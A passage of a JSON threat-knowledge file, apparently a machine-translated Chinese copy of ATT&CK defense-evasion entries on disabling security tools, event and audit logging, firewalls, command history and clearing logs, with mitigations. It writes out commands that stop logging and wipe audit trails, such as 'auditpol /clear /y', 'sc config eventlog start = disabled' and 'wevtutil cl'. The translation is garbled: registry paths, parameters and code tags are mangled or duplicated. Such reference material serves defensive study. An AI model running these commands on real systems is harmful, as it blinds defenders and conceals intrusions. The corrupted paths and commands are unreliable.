        },
        {
          "type": "text",
          "content": " </code>本机api函数来获得"
        },
        {
          "type": "code",
          "content": " kernelcallbacktable "
        },
        {
          "type": "text",
          "content": " </code>的指针。指针位于指针后，"
        },
        {
          "type": "code",
          "content": " kernelcallbacktable "
        },
        {
          "type": "text",
          "content": "可以重复，并且在表中设置了一个函数（例如，"
        },
        {
          "type": "code",
          "content": " fncopydata "
        },
        {
          "type": "text",
          "content": "）设置为恶意有效载荷的地址（ex：ex：ex：fia <<代码> writeProcessMemory（）</code>）。然后，将固定在表格的新地址更新。调用篡改功能后，将触发恶意有效载荷。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通常使用Windows消息调用篡改功能。劫持过程并执行恶意代码后，"
        },
        {
          "type": "code",
          "content": " kernelcallcallbacktable "
        },
        {
          "type": "text",
          "content": "也可以通过恶意有效载荷将其恢复为原始状态。将"
        },
        {
          "type": "code",
          "content": "内核返回"
        },
        {
          "type": "text",
          "content": "用于劫持执行流程可能会从安全产品中逃避检测，因为可以在合法的过程中掩盖执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于指示器的常见序列（例如：执行特定API函数），以阻止与过程注入/内存篡改有关的某些类型的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.001",
    "name": "Disable or Modify Tools",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改和/或禁用安全工具，以避免可能检测其恶意软件/工具和活动。这可能采用多种形式，例如杀死安全软件流程或服务，修改 /删除注册表键或配置文件，以使工具无法正常运行，或其他方法来干扰安全工具扫描或报告信息。对手也可能会禁用更新，以防止最新的安全补丁在受害者系统上触及工具。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可能篡改安全工具部署和利用的工件。安全工具可以对系统组件进行动态更改，以保持对特定事件的可见性。例如，安全产品可能会加载自己的模块和/或修改由进程加载的模块以促进数据收集。与指示器阻塞类似，对手可能会解开或以其他方式修改这些功能是由工具添加的这些功能（尤其是在Userland中存在或其他可能是对手可以访问的功能），以避免检测。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以专注于特定应用，例如Sysmon。例如，"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentControlset \\ control \\ wmi \\ wmi \\ autologger \\ eventlog-microsoft-windows-sysmon-operational "
        },
        {
          "type": "text",
          "content": "可能会被修改以篡改并潜在脱落，系统记录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在网络设备上，对手可能会尝试通过更改启动配置文件并有效地禁用通常发生在启动时的固件验证来跳过数字签名验证检查。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在云环境中，对手禁用的工具可能包括云监视代理，这些云监视代理将其报告回AWS CloudWatch或Google Cloud Monitor等服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此外，尽管防御工具可能具有反她型机制，但对手可能会滥用诸如合法的根源清除套件之类的工具，以损害和/或禁用这些工具。例如，对手已经使用了诸如Gmer之类的工具来查找并关闭受感染系统上的隐藏过程和防病毒软件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此外，对手可能会从反病毒软件中利用合法驱动程序来访问内核空间（即对特权升级的利用），这可能会导致绕过反篡改功能。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "在适当的情况下使用应用程序控件，尤其是在组织安全策略之外的工具（例如Rootkit删除工具）以外的执行工具，这些工具已被滥用以损害系统防御。确保仅使用批准的安全应用程序并在企业系统上运行。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保适当的过程和文件权限到位，以防止对手禁用或干扰安全服务。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保获得适当的注册表权限，以防止对手禁用或干扰安全服务。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保获得适当的用户权限，以防止对手禁用或干扰安全服务。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.002",
    "name": "Disable Windows Event Logging",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会禁用Windows事件记录以限制可以利用检测和审核的数据。Windows事件日志记录用户和系统活动，例如登录尝试，过程创建等。安全工具和分析师使用此数据来生成检测。"
        }
      ],
      [
        {
          "type": "text",
          "content": "EventLog服务维护来自各种系统组件和应用程序的事件日志。默认情况下，服务会在系统启动时自动启动。由本地安全策略（SECPOL.MSC）维护的审计策略定义了哪些系统事件EventLog服务日志。可以通过运行secpol.msc来更改安全审计策略设置>用于高级审核策略设置。"
        },
        {
          "type": "code",
          "content": " auditpol.exe "
        },
        {
          "type": "text",
          "content": "也可以用于设置审核策略。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以针对系统范围的日志记录，也可以针对特定应用程序的日志记录。例如，可以使用"
        },
        {
          "type": "code",
          "content": " Set -Service -Name EventLog -Status停止"
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " sc config eventlog start = disabled "
        },
        {
          "type": "text",
          "content": "命令（随后手动停止服务）使用"
        },
        {
          "type": "code",
          "content": "停止服务-Name EventLog "
        },
        {
          "type": "text",
          "content": "）。此外，可以通过在"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentControlset \\ services \\ eventlog "
        },
        {
          "type": "text",
          "content": "中修改“启动”值来禁用该服务，然后重新启动系统以使更改生效。"
        }
      ],
      [
        {
          "type": "text",
          "content": "有几种方法可以通过注册表密钥修改禁用EventLog服务。首先，如果没有管理员特权，对手可以在键"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentControlset \\ control \\ wmi \\ wmi \\ autoologger \\ entlog-security "
        },
        {
          "type": "text",
          "content": "中修改“启动”值，然后重新启动系统以使系统重新启动以解散安全事件。第二，具有管理员特权，对手可以在"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentControlset \\ control \\ wmi \\ wmi \\ autologger \\ eventlog-system "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ hkey_machine \\ machine \\ contric_machine \\ currentconcontrollolset \\ wmiolog \\ wmi \\ wmiger\\ EventLog-application "
        },
        {
          "type": "text",
          "content": "禁用整个EventLog。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此外，对手可以在命令提示中使用"
        },
        {
          "type": "code",
          "content": " auditpol "
        },
        {
          "type": "text",
          "content": "及其子命令来禁用审核或清除审核策略。要启用或禁用指定的设置或审核类别，对手可以使用"
        },
        {
          "type": "code",
          "content": "/Success "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": "/FAIFE "
        },
        {
          "type": "text",
          "content": "参数。例如，<code> auditpol /set /类别：“帐户登录” /成功：disable /fafer：disable < /code>关闭帐户登录类别的审核。为了清除审计策略，对手可以运行以下行：<code> auditpol /clear /y < /code>或<code> auditpol /remove /allusers < /code>。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过禁用Windows事件记录，对手可以操作，而留下更少的妥协证据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑对管理员帐户的"
            },
            {
              "type": "code",
              "content": " AUDITPOL "
            },
            {
              "type": "text",
              "content": "定期审查，并在SIEM上执行动态基础，以调查潜在的恶意活动。还要确保EventLog服务及其线程正确运行。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保已适当的过程和文件权限，以防止对手禁用或干扰日志记录或删除或修改.EVTX记录文件。确保位于"
            },
            {
              "type": "code",
              "content": " C：\\ Windows \\ System32 \\ Winevt \\ Logs "
            },
            {
              "type": "text",
              "content": "的.EVTX文件具有适当的文件权限，可用于有限的，合法的访问和审核策略以进行检测。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保获得适当的注册表许可，以防止对手禁用或干扰记录。Minint注册表密钥的添加禁用事件查看器。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保获得适当的用户权限，以防止对手禁用或干扰记录。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.003",
    "name": "Impair Command History Logging",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会损害命令记录记录以隐藏在受损系统上运行的命令。各种命令口译员跟踪命令用户在其终端中输入的键入，以便用户可以重新检测他们所做的工作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和MacOS上，命令历史记录在由环境变量<Code> Histfile </code>指向的文件中跟踪。当用户登录系统时，将此信息冲入用户主目录中的文件，称为"
        },
        {
          "type": "code",
          "content": "〜/.bash_history "
        },
        {
          "type": "text",
          "content": "。"
        },
        {
          "type": "code",
          "content": " histControl "
        },
        {
          "type": "text",
          "content": "环境变量会跟踪"
        },
        {
          "type": "code",
          "content": " history "
        },
        {
          "type": "text",
          "content": "命令应保存的内容，并最终进入"
        },
        {
          "type": "code",
          "content": "〜/.bash_history "
        },
        {
          "type": "text",
          "content": "当用户注销时。"
        },
        {
          "type": "code",
          "content": " HistControl "
        },
        {
          "type": "text",
          "content": "默认情况下不存在MACOS，但可以由用户设置并将受到尊重。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以清除历史环境变量（"
        },
        {
          "type": "code",
          "content": " unset Histfile "
        },
        {
          "type": "text",
          "content": "），或将命令历史记录大小设置为零（"
        },
        {
          "type": "code",
          "content": "导出histFilesize = 0 "
        },
        {
          "type": "text",
          "content": "）以防止命令记录。此外，可以将"
        },
        {
          "type": "code",
          "content": " HistControl "
        },
        {
          "type": "text",
          "content": "配置为忽略从空间开始的命令，只需将其设置为“ ignorespace”即可。"
        },
        {
          "type": "code",
          "content": " HistControl "
        },
        {
          "type": "text",
          "content": "也可以设置为忽略重复命令，通过将其设置为“忽略”。在某些Linux系统中，默认情况下将其设置为“ impane both”，涵盖了以前的两个示例。这意味着“ LS”将无法保存，但是“ LS”将被历史保存。对手可以通过简单地为其所有终端命令准备一个空间而滥用此操作而无需留下痕迹。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Windows系统上，"
        },
        {
          "type": "code",
          "content": " psReadline "
        },
        {
          "type": "text",
          "content": "模块跟踪所有PowerShell会话中使用的命令，然后将它们写入文件（"
        },
        {
          "type": "code",
          "content": " $ enk：appdata \\ microsoft \\ microsoft \\ windows \\ powerShell \\ psreadline \\ psreadline \\ consolehost_history.txt </code </code </code </code </code </code </code "
        },
        {
          "type": "text",
          "content": "默认情况下）。对手可以使用"
        },
        {
          "type": "code",
          "content": " set -psreadlineOption -thistorySave {file path} "
        },
        {
          "type": "text",
          "content": "使用"
        },
        {
          "type": "code",
          "content": " set -psreadlineOption -historySave {"
        },
        {
          "type": "text",
          "content": "更改这些日志。这将导致"
        },
        {
          "type": "code",
          "content": " consoleHost_history.txt "
        },
        {
          "type": "text",
          "content": "停止接收日志。此外，可以使用PowerShell命令"
        },
        {
          "type": "code",
          "content": " set -psReadlineOption -thistorySavestyle savenothing "
        },
        {
          "type": "text",
          "content": "关闭登录该文件的记录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以利用网络设备上的网络设备CLI来禁用历史命令记录（例如"
        },
        {
          "type": "code",
          "content": " no记录"
        },
        {
          "type": "text",
          "content": "）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1039",
        "name": "环境变量权限",
        "description": [
          [
            {
              "type": "text",
              "content": "防止用户更改"
            },
            {
              "type": "code",
              "content": " HistControl "
            },
            {
              "type": "text",
              "content": "，"
            },
            {
              "type": "code",
              "content": " Histfile "
            },
            {
              "type": "text",
              "content": "和"
            },
            {
              "type": "code",
              "content": " Histfilesize "
            },
            {
              "type": "text",
              "content": "环境变量。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "确保"
            },
            {
              "type": "code",
              "content": " HistControl "
            },
            {
              "type": "text",
              "content": "环境变量设置为“忽略”，而不是“ implooreboth”或“ nignorespace”。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.004",
    "name": "Disable or Modify System Firewall",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会禁用或修改系统防火墙，以绕过控制网络使用的控制。更改可以禁用整个机制，并添加，删除或修改特定规则。可以根据操作系统（包括通过命令行，编辑Windows注册表键和Windows Control面板）来完成多种方式。"
        }
      ],
      [
        {
          "type": "text",
          "content": "修改或禁用系统防火墙可能会启用对手C2通信，横向移动和/或数据剥落，否则不允许使用。例如，对手可以使用非传统和潜在的证券化端口（即非标准端口）为众所周知的协议（例如RDP）添加新的防火墙规则。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查帐户角色权限，以确保只有预期的用户和角色才有权限修改系统防火墙。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保已适当的过程和文件权限，以防止对手禁用或修改防火墙设置。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保获得适当的注册表权限，以防止对手禁用或修改防火墙设置。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保获得适当的用户权限，以防止对手禁用或修改防火墙设置。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.006",
    "name": "Indicator Blocking",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会试图阻止传感器通常捕获和分析传感器捕获的指标或事件。这可能包括恶意重定向甚至禁用基于主机的传感器，例如Windows（ETW）的事件跟踪（ETW），通过篡改控制事件遥测的集合和流程的设置。这些设置可以存储在系统中和/或注册表中，以及可以通过PowerShell或Windows Management Instrumentation等管理实用程序访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，对手可以在"
        },
        {
          "type": "code",
          "content": " file "
        },
        {
          "type": "text",
          "content": "中修改"
        },
        {
          "type": "code",
          "content": " <代码> hkey_local_machine \\ system \\ currentControlset \\ services \\ eventlog \\ eventlog \\ security \\ security "
        },
        {
          "type": "text",
          "content": "将其恶意操作隐藏在新的或不同的.evtx日志文件中。此操作不需要系统重新启动，并立即生效。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以多种方法来实现ETW中断，但是最直接通过使用PowerShell "
        },
        {
          "type": "code",
          "content": " set-etWtraceProvider定义条件"
        },
        {
          "type": "text",
          "content": " cmdlet或直接与注册表接口以进行更改。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在基于网络的指标报告的情况下，对手可能会阻止与报告相关的流量，以防止中央分析。这可以通过多种方式来完成，例如停止负责转发遥测的本地流程和/或创建基于主机的防火墙规则，以阻止负责汇总事件的特定主机的流量，例如安全信息和事件管理（SIEM）产品。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux环境中，对手可能会禁用或重新配置日志处理工具，例如Syslog或nxlog，以抑制检测和监视功能，以促进遵循行为。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保通过适当的权限和访问控件确保事件示踪剂/转发器，防火墙策略和其他相关机制。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑以重复的间隔自动重新启动转发机制（例如：时间，现场等），并将适当的更改管理应用于防火墙规则和其他相关系统配置。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保通过适当的权限和访问控件确保事件示踪剂/远期机，防火墙策略和其他相关机制，并且无法通过用户帐户来操纵。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.007",
    "name": "Disable or Modify Cloud Firewall",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在云环境中禁用或修改防火墙，以绕过限制访问云资源的控制。云防火墙与在禁用或修改系统防火墙中描述的系统防火墙分开。"
        }
      ],
      [
        {
          "type": "text",
          "content": "云环境通常使用限制性安全组和防火墙规则，这些规则仅允许通过预期的端口和协议从受信任的IP地址进行网络活动。对手可能会引入新的防火墙规则或政策，以允许进入受害者云环境。例如，对手可以使用脚本或实用程序，该脚本或实用程序在现有的安全组中创建新的入学规则以允许任何TCP/IP连接性，或删除网络限制来支持与恶意活动（例如隐式计算）相关的流量。"
        }
      ],
      [
        {
          "type": "text",
          "content": "修改或禁用云防火墙可能会启用对手C2通信，横向移动和/或数据剥落，否则不允许。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查帐户角色权限，以确保只有预期的用户和角色才有许可来修改云防火墙。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保将最小特权原则应用于身份和访问管理（IAM）安全政策。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.008",
    "name": "Disable or Modify Cloud Logs",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以禁用或修改云记录功能和集成，以限制其活动中收集的数据并避免检测。云环境允许收集和分析审核和应用程序日志，这些日志可洞悉用户在环境中所做的活动。如果对手有足够的权限，他们可以禁用或修改记录以避免发现其活动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，在AWS中，对手可能会在进行进一步的恶意活动之前禁用CloudWatch/CloudTrail集成。他们可能会篡改日志记录功能 - 例如，通过删除任何关联的SNS主题，禁用多区域记录或禁用验证和/或加密日志文件的设置。在Office 365中，对手可以通过使用"
        },
        {
          "type": "code",
          "content": " set-mailboxauditbypassociation "
        },
        {
          "type": "text",
          "content": " cmdlet禁用特定用户的邮件收集活动，通过禁用M365的M365高级审核，或通过将用户许可从企业E5降低获得企业E3许可证。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "配置默认帐户策略以启用记录。管理政策，以确保只有必要的用户才能有权更改记录策略。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.009",
    "name": "Safe Mode Boot",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Windows安全模式以禁用端点防御。安全模式启动Windows操作系统，其中一组有限的驱动程序和服务。第三方安全软件（例如端点检测和响应（EDR）工具）在安全模式下启动Windows后可能不会启动。安全模式有两个版本：安全模式和通过网络的安全模式。安全模式引导后可以启动其他服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用安全模式，以禁用可能不会从有限的引导开始的端点防御。下次重启后，可以通过修改启动配置数据（BCD）商店将主机施加到安全模式，该修改是管理启动应用程序设置的文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以通过修改相关注册表值（即修改注册表）来将其恶意应用程序添加到以安全模式开始的最小服务列表中。恶意组件对象模型（COM）对象也可以在安全模式下注册并加载。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将管理员帐户限制为尽可能少的个人，遵循至少特权原则，可能会滥用以安全模式远程启动机器。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "确保端点防御在安全模式下运行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.010",
    "name": "Downgrade Attack",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以降级或使用可能过时，脆弱和/或不支持更新的安全控制的系统功能的版本。降级攻击通常会利用系统的向后兼容性，将其迫使其进入较不安全的操作模式。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会降级并使用系统的功能的各种较较低的安全版本，例如命令和脚本解释器，甚至可以滥用的网络协议，以使对手在中间或网络嗅探。例如，PowerShell版本5+包括可以记录执行的脚本内容的脚本块记录（SBL）。但是，对手可能会尝试执行以前的PowerShell版本，该版本不支持SBL，目的是损害防御措施，同时运行可能已检测到的恶意脚本。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会类似地将网络流量从加密的HTTPS连接降级到无抵押的HTTP连接，该连接在清晰的文本中揭示网络数据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑在可能的情况下删除不需要环境的工具的先前版本。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑在内部Web服务器上实施策略，例如HTTP严格的运输安全性，以强制使用HTTPS/网络流量加密以防止不安全的连接。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.011",
    "name": "Spoof Security Alerting",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会欺骗工具中的安全警报，提供虚假的证据，以损害防御者对恶意活动的认识。防御工具产生的消息包含有关潜在安全事件以及安全软件和系统功能状态的信息。安全报告消息对于监视系统的正常操作和确定可能发出安全事件的重要事件很重要。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以为安全工具继续运行，即使在禁用了合法的安全工具（例如，禁用或修改工具）之后，也可以掩盖安全工具继续运行的积极肯定，而不是除了指标阻止方面。即使感染后，对手也可以呈现“健康”的系统状态。这可以滥用，以通过延迟防御者反应来实现进一步的恶意活动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，对手可能会在禁用Windows Defender和其他系统工具后显示具有“健康”系统状态的假窗口安全性GUI和托盘图标。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "使用应用程序控件来减轻可能用于欺骗安全警报的有效载荷的安装和使用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1562.012",
    "name": "Disable or Modify Linux Audit System",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Impair Defenses",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会禁用或修改Linux审核系统以隐藏恶意活动并避免检测。Linux Admins使用Linux审核系统来跟踪系统上的安全性信息。Linux审核系统在内核级别运行，并根据预先配置的规则维护有关应用程序和系统活动（例如过程，网络，文件和登录事件）的事件日志。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通常称为"
        },
        {
          "type": "code",
          "content": " auditd "
        },
        {
          "type": "text",
          "content": "，这是用于将事件写入磁盘的守护程序的名称，并由"
        },
        {
          "type": "code",
          "content": " audit.conf "
        },
        {
          "type": "text",
          "content": "配置文件中设置的参数控制。配置日志生成规则的两种主要方法是通过命令行"
        },
        {
          "type": "code",
          "content": " auditctl "
        },
        {
          "type": "text",
          "content": "实用程序和文件"
        },
        {
          "type": "code",
          "content": " /etc/audit/audit.rules "
        },
        {
          "type": "text",
          "content": "，包含"
        },
        {
          "type": "code",
          "content": " auditctl的顺序"
        },
        {
          "type": "text",
          "content": "在启动时加载的命令。"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用根特权，对手可能能够通过禁用审核系统服务，编辑配置/规则文件或挂接审计系统库功能来确保其活动未能记录下来。使用命令行，对手可以通过与"
        },
        {
          "type": "code",
          "content": " auditd "
        },
        {
          "type": "text",
          "content": "守护程序相关的杀死过程或使用"
        },
        {
          "type": "code",
          "content": " Sytemctl </code "
        },
        {
          "type": "text",
          "content": "来停止审核服务。对手还可以连接审核系统功能，以禁用日志记录或修改"
        },
        {
          "type": "code",
          "content": " /etc/audit/audit.rules "
        },
        {
          "type": "text",
          "content": " </code>或"
        },
        {
          "type": "code",
          "content": " audit.conf "
        },
        {
          "type": "text",
          "content": "文件中包含的规则，以忽略恶意活动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查帐户角色权限，以确保只有预期的用户和角色才有权限修改日志记录设置。"
            }
          ],
          [
            {
              "type": "text",
              "content": "为了确保无法在运行时修改审核规则，请将"
            },
            {
              "type": "code",
              "content": " auditctl -e 2 "
            },
            {
              "type": "text",
              "content": "添加为audit.rules文件中的最后一个命令。一旦开始，将在此模式下更改配置的任何尝试都将被审核和拒绝。只能通过重新启动机器来更改配置。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "对手必须在本地系统上具有根级访问权限，以充分利用此技术。确保将用户和帐户限制为他们需要的最低特权。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1070.001",
    "name": "Clear Windows Event Logs",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Indicator Removal",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会清除Windows事件日志以隐藏入侵的活动。Windows事件日志是计算机警报和通知的记录。事件的系统定义有三个：系统，应用和安全性，其中有五种事件类型：错误，警告，信息，成功审核和故障审核。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用以下实用命令清除事件日志："
        }
      ],
      [
        {
          "type": "list",
          "content": "WEVTUTIL CL系统"
        },
        {
          "type": "list",
          "content": "WEVTUTIL CL应用"
        },
        {
          "type": "list",
          "content": "WEVTUTIL CL安全性"
        }
      ],
      [
        {
          "type": "text",
          "content": "这些日志也可以通过其他机制来清除，例如事件查看器GUI或PowerShell。例如，对手可以使用powerShell命令"
        },
        {
          "type": "code",
          "content": " remove -eventlog -logname security "
        },
        {
          "type": "text",
          "content": "删除安全事件log，然后重新启动后，禁用将来的日志记录。注意：在命令运行和重新启动的时间之间，可能仍会生成事件并登录.EVTX文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "在本地和运输中混淆/加密事件文件，以避免向对手提供反馈。"
            }
          ]
        ]
      },
      {
        "id": "M1029",
        "name": "远程数据存储",
        "description": [
          [
            {
              "type": "text",
              "content": "自动将事件转发到日志服务器或数据存储库中，以防止对手可以在本地系统上找到和操纵数据的条件。在可能的情况下，将事件报告的时间延迟最小化，以避免在本地系统上延长存储。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "保护生成的事件文件，这些文件在本地存储，并具有适当的许可和身份验证，并限制了对手通过防止特权升级机会增加特权的机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1070.002",
    "name": "Clear Linux or Mac System Logs",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Indicator Removal",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会清除系统日志以隐藏入侵的证据。MACOS和Linux通过系统日志跟踪系统或用户启动的操作。大多数本机系统记录存储在"
        },
        {
          "type": "code",
          "content": "/var/log/"
        },
        {
          "type": "text",
          "content": "目录下。该目录中的子文件夹按照其相关功能对日志进行分类，例如："
        }
      ],
      [
        {
          "type": "list",
          "content": "/var/log/messages ::一般和系统相关的消息"
        },
        {
          "type": "list",
          "content": "/var/log/secure or/var/log/auth.log：身份验证日志"
        },
        {
          "type": "list",
          "content": "/var/log/utmp或/var/log/wtmp：登录记录"
        },
        {
          "type": "list",
          "content": "/var/log/kern.log：内核日志"
        },
        {
          "type": "list",
          "content": "/var/log/cron.log：crond logs"
        },
        {
          "type": "list",
          "content": "/var/log/maillog：邮件服务器日志"
        },
        {
          "type": "list",
          "content": "/var/log/httpd/：Web服务器访问和错误日志"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
